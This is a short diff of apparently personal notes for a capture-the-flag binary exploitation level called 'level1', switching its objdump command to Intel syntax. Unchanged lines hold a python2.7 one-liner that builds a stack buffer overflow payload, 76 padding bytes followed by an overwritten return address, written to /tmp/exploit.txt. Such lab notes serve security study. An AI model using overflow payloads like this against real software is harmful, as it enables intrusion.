@@ -1,7 +1,7 @@
 # level1
 
 ## disassemble
-objdump -d level1
+objdump -dC -M intel level1
 
 ## exploit
 python2.7 -c 'print("B"*76 + "\x44\x84\x04\x08")' > /tmp/exploit.txt
